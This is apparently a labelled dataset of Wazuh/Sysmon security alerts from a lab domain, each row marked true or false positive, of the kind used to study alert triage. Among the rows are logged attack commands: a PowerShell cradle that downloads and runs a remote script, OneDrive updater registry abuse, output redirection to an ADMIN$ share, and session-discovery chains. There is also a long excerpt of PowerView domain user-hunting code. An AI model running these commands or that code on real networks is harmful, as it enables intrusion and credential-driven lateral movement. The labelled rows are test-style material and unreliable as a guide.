RuleName: technique_id=T1546.015,technique_name=Component Object Model Hijacking
EventType: SetValue
UtcTime: 2025-06-29 12:14:03.710
ProcessGuid: {ff3427f9-2d6d-6861-c301-000000001000}
ProcessId: 4740
Image: C:\WINDOWS\system32\svchost.exe
TargetObject: HKLM\SOFTWARE\Microsoft\MsixRegistryCompatibility\Package\Microsoft.Paint_11.2504.531.0_x64__8wekyb3d8bbwe\User\SOFTWARE\Classes\CLSID\{D3E34B21-9D75-101A-8C3D-00AA001A1652}\LocalServer32\ServerExecutable
Details: C:\Program Files\WindowsApps\Microsoft.Paint_11.2504.531.0_x64__8wekyb3d8bbwe\PaintApp\mspaint.exe
User: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c powershell.exe -exec bypass -noprofile \""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText\"" \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-04 20:24:19.085
ProcessGuid: {ff3427f9-3873-6868-bb02-000000001400}
ProcessId: 10000
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c powershell.exe -exec bypass -noprofile ""$comMsXml=New-Object -ComObject MsXml2.ServerXmlHttp;$comMsXml.Open('GET','https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1059.001/src/test.ps1',$False);$comMsXml.Send();IEX $comMsXml.ResponseText""
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Executable file dropped in folder commonly used by malware 15 Critical Executable file dropped in folder commonly used by malware 92213 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\Program Files (x86)\\Microsoft\\Edge\\Application\\msedge.exe C:\\Users\\snell\\AppData\\Local\\Temp\\chrome_Unpacker_BeginUnzipping9076_1974459208\\v1FieldTypes.json SOCLAB\\snell ""File created:
RuleName: technique_id=T1047,technique_name=File System Permissions Weakness
UtcTime: 2025-07-03 08:16:54.257
ProcessGuid: {ff3427f9-3c13-6866-5a01-000000001200}
ProcessId: 9076
Image: C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe
TargetFilename: C:\Users\snell\AppData\Local\Temp\chrome_Unpacker_BeginUnzipping9076_1974459208\v1FieldTypes.json
CreationUtcTime: 2025-07-03 08:16:54.257
User: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
"Powershell process spawned powershell instance 4 Low Powershell process spawned powershell instance 92027 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""powershell.exe\"" &amp; {if (-not (Test-Path \\\""\""C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe\\\""\"")) {     Write-Host \\\""\""OneDriveStandaloneUpdater.exe not found at C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe. Test cannot continue.\\\""\""     exit 1 }  New-Item -Path \\\""\""HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\""\"" -Force | Out-Null Set-ItemProperty -Path \\\""\""HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\""\"" -Name \\\""\""UpdateRingSettingURLFromOC\\\""\"" -Value \\\""\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\""\"" -Type String -Force Set-ItemProperty -Path \\\""\""HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\""\"" -Name \\\""\""ODSUUpdateXMLUrlFromOC\\\""\"" -Value \\\""\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\""\"" -Type String -Force Set-ItemProperty -Path \\\""\""HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\""\"" -Name \\\""\""UpdateXMLUrlFromOC\\\""\"" -Value \\\""\""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\\\""\"" -Type String -Force Set-ItemProperty -Path \\\""\""HKCU:\\Software\\Microsoft\\OneDrive\\UpdateOfficeConfig\\\""\"" -Name \\\""\""UpdateOfficeConfigTimestamp\\\""\"" -Value 99999999999 -Type QWord -Force  # Run OneDrive Standalone Updater &amp; \\\""\""C:\\Users\\$env:USERNAME\\AppData\\Local\\Microsoft\\OneDrive\\OneDriveStandaloneUpdater.exe\\\""\""} \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1086,technique_name=PowerShell
UtcTime: 2025-07-04 21:51:32.108
ProcessGuid: {ff3427f9-4ce4-6868-6706-000000001400}
ProcessId: 6876
Image: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
FileVersion: 10.0.26100.3323 (WinBuild.160101.0800)
Description: Windows PowerShell
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: PowerShell.EXE
CommandLine: ""powershell.exe"" & {if (-not (Test-Path \""""C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe\"""")) {
    Write-Host \""""OneDriveStandaloneUpdater.exe not found at C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe. Test cannot continue.\""""
    exit 1
}

New-Item -Path \""""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig\"""" -Force | Out-Null
Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig\"""" -Name \""""UpdateRingSettingURLFromOC\"""" -Value \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"""" -Type String -Force
Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig\"""" -Name \""""ODSUUpdateXMLUrlFromOC\"""" -Value \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"""" -Type String -Force
Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig\"""" -Name \""""UpdateXMLUrlFromOC\"""" -Value \""""https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt\"""" -Type String -Force
Set-ItemProperty -Path \""""HKCU:\Software\Microsoft\OneDrive\UpdateOfficeConfig\"""" -Name \""""UpdateOfficeConfigTimestamp\"""" -Value 99999999999 -Type QWord -Force

# Run OneDrive Standalone Updater
& \""""C:\Users\$env:USERNAME\AppData\Local\Microsoft\OneDrive\OneDriveStandaloneUpdater.exe\""""}
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-1e7f-6868-f045-0a0000000000}
LogonId: 0xA45F0
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=8B595BBBF8695CE90EEEA612B440ECC79ACC6C5D,MD5=BD542C1197F3B5217B5C5B5C4A25BD0C,SHA256=75F490D70F821AFBBBB28D8AE45FA712C0EF39F73832AF5FF0DF284BEB22A9FC,IMPHASH=AFACF6DC9041114B198160AAB4D0AE77
ParentProcessGuid: {ff3427f9-2077-6868-5c01-000000001400}
ParentProcessId: 9196
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"File added to the system. 5 Low File added to the system. 554 ossec syscheck syscheck_entry_added syscheck_file syscheck_new_entry Linux-Server File '/home/vboxuser/f5auto-bigip-ve-bgp-ecmp-local/tf/terraform.tfstate' added
Mode: realtime
 syscheck",0,FP
"Registry Value Integrity Checksum Changed 5 Low Registry Value Integrity Checksum Changed 750 ossec syscheck syscheck_entry_modified syscheck_registry syscheck_registry_value_modified WinSrv2019 Registry Value '[x32] HKEY_LOCAL_MACHINE\System\CurrentControlSet\Services\WinDefend\FailureActions' modified
Mode: scheduled
Changed attributes: md5,sha1,sha256
Old md5sum was: 'bda7dde915185558a7c8bac98a1a57b3'
New md5sum is : '81320f6a3736b06676c1d3f90268a2ed'
Old sha1sum was: '7115db0c210cd89370b0daed48f7ffef5c052ab7'
New sha1sum is : 'db19f062229c774b555cc8c78b210f5ec25dd706'
Old sha256sum was: 'd8242ffec082a5744c29f4a270133ab1abdc9a7678eaa02ae75e7e5dd99a21d7'
New sha256sum is : '930d588221158857e0fa645dd4c84446cf7fc0c90e8a703296e594ec30a5af0d'
 syscheck",0,FP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""cmd.exe\"" /c cmd.exe /Q /c hostname 1&gt; \\\\127.0.0.1\\ADMIN$\\output.txt 2&gt;&amp;1 \""C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe\"" C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-06 13:51:16.152
ProcessGuid: {ff3427f9-7f54-686a-0d06-000000001600}
ProcessId: 6744
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""cmd.exe"" /c cmd.exe /Q /c hostname 1> \\127.0.0.1\ADMIN$\output.txt 2>&1
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-5f92-686a-d1e8-3b0200000000}
LogonId: 0x23BE8D1
TerminalSessionId: 2
IntegrityLevel: High
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-60b8-686a-0404-000000001600}
ParentProcessId: 6808
ParentImage: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
ParentCommandLine: ""C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"" 
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Powershell script used ""Invoke-command"" cmdlet to execute code on remote computer 14 High Powershell script used ""Invoke-command"" cmdlet to execute code on remote computer 91823 windows  powershell windows_eventchannel Win11Client ""Creating Scriptblock text (42 of 51):
        if ($StealthSource -match 'DFS|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for DFS servers'
                    # # TODO: fix the passed parameters to Get-DomainDFSShare
                    # $ComputerName += Get-DomainDFSShare -Domain $Domain -Server $DomainController | ForEach-Object {$_.RemoteServerName}
                }
                if ($StealthSource -match 'DC|All') {
                    Write-Verbose '[Find-DomainUserLocation] Querying for domain controllers'
                    $DCSearcherArguments = @{
                        'LDAP' = $True
                    }
                    if ($PSBoundParameters['Domain']) { $DCSearcherArguments['Domain'] = $Domain }
                    if ($PSBoundParameters['ComputerDomain']) { $DCSearcherArguments['Domain'] = $ComputerDomain }
                    if ($PSBoundParameters['Server']) { $DCSearcherArguments['Server'] = $Server }
                    if ($PSBoundParameters['Credential']) { $DCSearcherArguments['Credential'] = $Credential }
                    $DomainControllers = Get-DomainController @DCSearcherArguments | Select-Object -ExpandProperty dnshostname
                    if ($DomainControllers -isnot [System.Array]) { $DomainControllers = @($DomainControllers) }
                    $TargetComputerArrayList.AddRange( $DomainControllers )
                }
                $TargetComputers = $TargetComputerArrayList.ToArray()
            }
            else {
                Write-Verbose '[Find-DomainUserLocation] Querying for all computers in the domain'
                $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
            }
        }
        Write-Verbose ""[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)""
        if ($TargetComputers.Length -eq 0) {
            throw '[Find-DomainUserLocation] No hosts found to enumerate'
        }

        # get the current user so we can ignore it in the results
        if ($PSBoundParameters['Credential']) {
            $CurrentUser = $Credential.GetNetworkCredential().UserName
        }
        else {
            $CurrentUser = ([Environment]::UserName).ToLower()
        }

        # now build the user target set
        if ($PSBoundParameters['ShowAll']) {
            $TargetUsers = @()
        }
        elseif ($PSBoundParameters['UserIdentity'] -or $PSBoundParameters['UserLDAPFilter'] -or $PSBoundParameters['UserSearchBase'] -or $PSBoundParameters['UserAdminCount'] -or $PSBoundParameters['UserAllowDelegation']) {
            $TargetUsers = Get-DomainUser @UserSearcherArguments | Select-Object -ExpandProperty samaccountname
        }
        else {
            $GroupSearcherArguments = @{
                'Identity' = $UserGroupIdentity
                'Recurse' = $True
            }
            if ($PSBoundParameters['UserDomain']) { $GroupSearcherArguments['Domain'] = $UserDomain }
            if ($PSBoundParameters['UserSearchBase']) { $GroupSearcherArguments['SearchBase'] = $UserSearchBase }
            if ($PSBoundParameters['Server']) { $GroupSearcherArguments['Server'] = $Server }
            if ($PSBoundParameters['SearchScope']) { $GroupSearcherArguments['SearchScope'] = $SearchScope }
            if ($PSBoundParameters['ResultPageSize']) { $GroupSearcherArguments['ResultPageSize'] = $ResultPageSize }
            if ($PSBoundParameters['ServerTimeLimit']) { $GroupSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
            if ($PSBoundParameters['Tombstone']) { $GroupSearcherArguments['Tombstone'] = $Tombstone }
            if ($PSBoundParameters['Credential']) { $GroupSearcherArguments['Credential'] = $Credential }
            $TargetUsers = Get-DomainGroupMember @GroupSearcherArguments | Select-Object -ExpandProperty MemberName
        }

        Write-Verbose ""[Find-DomainUserLocation] TargetUsers length: $($TargetUsers.Length)""
        if ((-not $ShowAll) -and ($TargetUsers.Length -eq 0)) {
            throw '[Find-DomainUserLocation] No users found to target'
        }

        # the host enumeration block we're using to enumerate all servers
        $HostEnumBlock = {
            Param($ComputerName, $TargetUsers, $CurrentUser, $Stealth, $TokenHandle)

            if ($TokenHandle) {
                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
            }

            ForEach ($TargetComputer in $ComputerName) {
                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
                if ($Up) {
                    $Sessions = Get-NetSession -ComputerName $TargetComputer
                    ForEach ($Session in $Sessions) {
                        $UserName = $Session.UserName
                        $CName = $Session.CName

                        if ($CName -and $CName.StartsWith('\\')) {
                            $CName = $CName.TrimStart('\')
                        }

                        # make sure we have a result, and ignore computer$ sessions
                        if (($UserName) -and ($UserName.Trim() -ne '') -and ($UserName -notmatch $CurrentUser) -and ($UserName -notmatch '\$$')) {

                            if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName)) {
                                $UserLocation = New-Object PSObject
                                $UserLocation | Add-Member Noteproperty 'UserDomain' $Null
                                $UserLocation | Add-Member Noteproperty 'UserName' $UserName
                                $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
                                $UserLocation | Add-Member Noteproperty 'SessionFrom' $CName

                                # try to resolve the DNS hostname of $Cname
                                try {
                                    $CNameDNSName = [System.Net.Dns]::GetHostEntry($CName) | Select-Object -ExpandProperty HostName
                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $CnameDNSName
                                }
                                catch {
                                    $UserLocation | Add-Member NoteProperty 'SessionFromName' $Null
                                }

                                # see if we're checking to see if we have local admin access on this machine
                                if ($CheckAccess) {
                                    $Admin = (Test-AdminAccess -ComputerName $CName).IsAdmin
                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                }
                                else {
                                    $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                }
                                $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                $UserLocation
                            }
                        }
                    }
                    if (-not $Stealth) {
                        # if we're not 'stealthy', enumerate loggedon users as well
                        $LoggedOn = Get-NetLoggedon -ComputerName $TargetComputer
                        ForEach ($User in $LoggedOn) {
                            $UserName = $User.UserName
                            $UserDomain = $User.LogonDomain

                            # make sure wet have a result
                            if (($UserName) -and ($UserName.trim() -ne '')) {
                                if ( (-not $TargetUsers) -or ($TargetUsers -contains $UserName) -and ($UserName -notmatch '\$$')) {
                                    $IPAddress = @(Resolve-IPAddress -ComputerName $TargetComputer)[0].IPAddress
                                    $UserLocation = New-Object PSObject
                                    $UserLocation | Add-Member Noteproperty 'UserDomain' $UserDomain
                                    $UserLocation | Add-Member Noteproperty 'UserName' $UserName
                                    $UserLocation | Add-Member Noteproperty 'ComputerName' $TargetComputer
                                    $UserLocation | Add-Member Noteproperty 'IPAddress' $IPAddress
                                    $UserLocation | Add-Member Noteproperty 'SessionFrom' $Null
                                    $UserLocation | Add-Member Noteproperty 'SessionFromName' $Null

                                    # see if we're checking to see if we have local admin access on this machine
                                    if ($CheckAccess) {
                                        $Admin = Test-AdminAccess -ComputerName $TargetComputer
                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Admin.IsAdmin
                                    }
                                    else {
                                        $UserLocation | Add-Member Noteproperty 'LocalAdmin' $Null
                                    }
                                    $UserLocation.PSObject.TypeNames.Insert(0, 'PowerView.UserLocation')
                                    $UserLocation
                                }
                            }
                        }
                    }
                }
            }

            if ($TokenHandle) {
                Invoke-RevertToSelf
            }
        }

        $LogonToken = $Null
        if ($PSBoundParameters['Credential']) {
            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential
            }
            else {
                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
            }
        }
    }

    PROCESS {
        # only ignore threading if -Delay is passed
        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {

            Write-Verbose ""[Find-DomainUserLocation] Total number of hosts: $($TargetComputers.count)""
            Write-Verbose ""[Find-DomainUserLocation] Delay: $Delay, Jitter: $Jitter""
            $Counter = 0
            $RandNo = New-Object System.Random

            ForEach ($TargetComputer in $TargetComputers) {
                $Counter = $Counter + 1

                # sleep for our semi-randomized interval
                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)

                Write-Verbose ""[Find-DomainUserLocation] Enumerating server $Computer ($Counter of $($TargetComputers.Count))""
                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $TargetUsers, $CurrentUser, $Stealth, $LogonToken

                if ($Result -and $StopOnSuccess) {
                    Write-Verbose ""[Find-DomainUserLocation] Target user found, returning early""
                    return
                }
            }
        }
        else {
            Write-Verbose ""[Find-DomainUserLocation] Using threading with threads: $Threads""
            Write-Verbose ""[Find-DomainUserLocation] TargetComputers length: $($TargetComputers.Length)""

            # if we're using threading, kick off the script block with New-ThreadedFunction
            $ScriptParams = @{
                'TargetUsers' = $TargetUsers
                'CurrentUser' = $CurrentUser
                'Stealth' = $Stealth
                'TokenHandle' = $LogonToken
            }

            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
        }
    }

    END {
        if ($LogonToken) {
            Invoke-RevertToSelf -TokenHandle $LogonToken
        }
    }
}


function Find-DomainProcess {
<#
.SYNOPSIS

Searches for processes on the domain using WMI, returning processes
that match a particular user specification or process name.

Thanks to @paulbrandau for the approach idea.

Author: Will Schroeder (@harmj0y)  
License: BSD 3-Clause  
Required Dependencies: Get-DomainComputer, Get-DomainUser, Get-DomainGroupMember, Get-WMIProcess, New-ThreadedFunction  

.DESCRIPTION

This function enumerates all machines on the current (or specified) domain
using Get-DomainComputer, and queries the domain for users of a specified group
(default 'Domain Admins') with Get-DomainGroupMember. Then for each server the
function enumerates any current processes running with Get-WMIProcess,
searching for processes running under any target user contexts or with the
specified -ProcessName. If -Credential is passed, it is passed through to
the underlying WMI commands used to enumerate the remote machines.

.PARAMETER ComputerName

Specifies an array of one or more hosts to enumerate, passable on the pipeline.
If -ComputerName is not passed, the default behavior is to enumerate all machines
in the domain returned by Get-DomainComputer.

.PARAMETER Domain

Specifies the domain to query for computers AND users, defaults to the current domain.

.PARAMETER ComputerDomain

Specifies the domain to query for computers, defaults to the current domain.

.PARAMETER ComputerLDAPFilter

Specifies an LDAP query string that is used to search for computer objects.

.PARAMETER ComputerSearchBase

Specifies the LDAP source to search through for computers,
e.g. ""LDAP://OU=secret,DC=testlab,DC=local"". Useful for OU queries.

.PARAMETER ComputerUnconstrained

Switch. Search computer objects that have unconstrained delegation.

.PARAMETER ComputerOperatingSystem

Search computers with a specific operating system, wildcards accepted.

.PARAMETER ComputerServicePack

Search computers with a specific service pack, wildcards accepted.

.PARAMETER ComputerSiteName

Search computers in the specific AD Site name, wildcards accepted.

.PARAMETER ProcessName

Search for processes with one or more specific names.

.PARAMETER UserIdentity

Specifies one or more user identities to search for.

.PARAMETER UserDomain

Specifies the domain to query for users to search for, defaults to the current domain.

.PARAMETER UserLDAPFilter

Specifies an LDAP query string that is used to search for target users.

.PARAMETER UserSearchBase

Specifies the LDAP source to search through for target users.
e.g. ""LDAP://OU=secret,DC=testlab,DC=local"". Useful for OU queries.

.PARAMETER UserGroupIdentity

Specifies a group identity to query for target users, defaults to 'Domain Admins.
If any other user specifications are set, then UserGroupIdentity is ignored.

.PARAMETER UserAdminCount

Switch. Search for users users with '(adminCount=1)' (meaning are/were privileged).

.PARAMETER Server

Specifies an Active Directory server (domain controller) to bind to.

.PARAMETER SearchScope

Specifies the scope to search under for computers, Base/OneLevel/Subtree (default of Subtree).

.PARAMETER ResultPageSize

Spec

ScriptBlock ID: a7aa712a-262a-46cc-9182-ebdb9a73fcc3
Path: "" WARNING Microsoft-Windows-PowerShell Microsoft-Windows-PowerShell/Operational EventChannel",1,TP
"Windows command prompt started by an abnormal process 4 Low Windows command prompt started by an abnormal process 92052 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client \""C:\\WINDOWS\\system32\\cmd.exe\"" /d /c C:\\WINDOWS\\system32\\hpatchmonTask.cmd C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p -s Schedule C:\\Windows\\System32\\cmd.exe C:\\Windows\\System32\\svchost.exe NT AUTHORITY\\SYSTEM ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-06-29 12:12:31.173
ProcessGuid: {ff3427f9-2daf-6861-2002-000000001000}
ProcessId: 4296
Image: C:\Windows\System32\cmd.exe
FileVersion: 10.0.26100.4202 (WinBuild.160101.0800)
Description: Windows Command Processor
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: Cmd.Exe
CommandLine: ""C:\WINDOWS\system32\cmd.exe"" /d /c C:\WINDOWS\system32\hpatchmonTask.cmd
CurrentDirectory: C:\WINDOWS\system32\
User: NT AUTHORITY\SYSTEM
LogonGuid: {ff3427f9-2958-6861-e703-000000000000}
LogonId: 0x3E7
TerminalSessionId: 0
IntegrityLevel: System
Hashes: SHA1=09C438B2B740E73B9BCBA70AF4B8CC10A31B4EEE,MD5=59A3F41DD84517FCF809BD65FFF5E721,SHA256=AE4943E5F3F763688E10601F090B4CAE3CE19F0B427007884B40D27D7FB9274D,IMPHASH=ED799256EDA047E9421AD70A5FE3ACD6
ParentProcessGuid: {ff3427f9-295a-6861-2000-000000001000}
ParentProcessId: 1624
ParentImage: C:\Windows\System32\svchost.exe
ParentCommandLine: C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule
ParentUser: NT AUTHORITY\SYSTEM"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",0,FP
PAM: Login session opened. 3 Low PAM: Login session opened. 5501 pam syslog authentication_success pam Linux-Server Jul 04 15:28:33 Linux-Server sudo[2675]: pam_unix(sudo:session): session opened for user root(uid=0) by vboxuser(uid=1000) journald,0,FP
"Gathered user information from Remote Desktop Service sessions 3 Low Gathered user information from Remote Desktop Service sessions 92022 sysmon sysmon_eid1_detections windows windows_eventchannel Win11Client qwinsta.exe  /server:localhost \""cmd.exe\"" /c cmd.exe /C whoami &amp; wmic useraccount get /ALL &amp; quser /SERVER:\""localhost\"" &amp; quser &amp; qwinsta.exe /server:localhost &amp; qwinsta.exe &amp; for /F \""tokens=1,2\"" %i in ('qwinsta /server:localhost ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; computers.txt &amp; @FOR /F %n in (computers.txt) DO @FOR /F \""tokens=1,2\"" %i in ('qwinsta /server:%n ^| findstr \""Active Disc\""') do @echo %i | find /v \""#\"" | find /v \""console\"" || echo %j &gt; usernames.txt C:\\Windows\\System32\\qwinsta.exe C:\\Windows\\System32\\cmd.exe SOCLAB\\snell ""Process Create:
RuleName: technique_id=T1059,technique_name=Command-Line Interface
UtcTime: 2025-07-05 13:02:57.525
ProcessGuid: {ff3427f9-2281-6869-9601-000000001500}
ProcessId: 8500
Image: C:\Windows\System32\qwinsta.exe
FileVersion: 10.0.26100.1882 (WinBuild.160101.0800)
Description: Query Session Utility
Product: Microsoft® Windows® Operating System
Company: Microsoft Corporation
OriginalFileName: qwinsta.exe
CommandLine: qwinsta.exe  /server:localhost 
CurrentDirectory: C:\Users\snell\AppData\Local\Temp\
User: SOCLAB\snell
LogonGuid: {ff3427f9-2071-6869-6f2f-080000000000}
LogonId: 0x82F6F
TerminalSessionId: 1
IntegrityLevel: High
Hashes: SHA1=E0BA6714F7CD0AA89665CE1190E3EAE72538CA97,MD5=3E40037F447723F686D1D0640D2CD8CA,SHA256=25B58392DFC39233BB2CFDB8D2109D7BE6C99ADBAEE0E0232A636E1DBF08175E,IMPHASH=D1DB32AE474C00FB7315E2D610E6A740
ParentProcessGuid: {ff3427f9-226b-6869-8f01-000000001500}
ParentProcessId: 9176
ParentImage: C:\Windows\System32\cmd.exe
ParentCommandLine: ""cmd.exe"" /c cmd.exe /C whoami & wmic useraccount get /ALL & quser /SERVER:""localhost"" & quser & qwinsta.exe /server:localhost & qwinsta.exe & for /F ""tokens=1,2"" %i in ('qwinsta /server:localhost ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > computers.txt & @FOR /F %n in (computers.txt) DO @FOR /F ""tokens=1,2"" %i in ('qwinsta /server:%n ^| findstr ""Active Disc""') do @echo %i | find /v ""#"" | find /v ""console"" || echo %j > usernames.txt
ParentUser: SOCLAB\snell"" INFORMATION Microsoft-Windows-Sysmon Microsoft-Windows-Sysmon/Operational EventChannel",1,TP
"Possible DLL search order hijack by C:\\Windows\\SystemTemp\\{5BC2AA27-E918-46DE-A629-AB71C1D40E4D}\\ssshim.dll created in Windows root folder 6 Low Possible DLL search order hijack by C:\\Windows\\SystemTemp\\{5BC2AA27-E918-46DE-A629-AB71C1D40E4D}\\ssshim.dll created in Windows root folder 92219 sysmon sysmon_eid11_detections windows windows_eventchannel Win11Client C:\\WINDOWS\\System32\\svchost.exe C:\\Windows\\SystemTemp\\{5BC2AA27-E918-46DE-A629-AB71C1D40E4D}\\ssshim.dll NT AUTHORITY\\SYSTEM ""File created:
RuleName: technique_id=T1047,technique_name=File System Permissions Weakness
UtcTime: 2025-07-06 13:36:48.089
ProcessGuid: {ff3427f9-51d7-686a-1400-000000001600}
ProcessId: 1184
Image: C:\WINDOWS\System32\svchost.exe
TargetFilename: C:\Windows\SystemTemp\{5BC2AA27-E918-46DE-A629-AB71C1D40E4D}\ssshim.dll
CreationUtcTime: 2025-07-06 13:36:48.089
